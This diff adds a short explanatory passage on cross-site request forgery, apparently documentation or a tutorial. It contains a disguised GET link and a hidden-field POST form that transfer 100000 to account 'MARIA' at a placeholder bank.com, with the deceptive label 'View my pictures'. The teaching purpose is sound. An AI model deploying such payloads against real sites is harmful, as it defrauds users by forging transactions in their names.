@@ -1,0 +1,11 @@
+The exploit URL can be disguised as an ordinary link, encouraging the
+victim to click it:
+<a href="http://bank.com/transfer.do?
+acct=MARIA&amount=100000">View my Pictures!</a>
+
+For POST requests:-
+<form action="http://bank.com/transfer.do" method="POST">
+<input type="hidden" name="acct" value="MARIA"/>
+<input type="hidden" name="amount" value="100000"/>
+<input type="submit" value="View my pictures"/>
+</form>
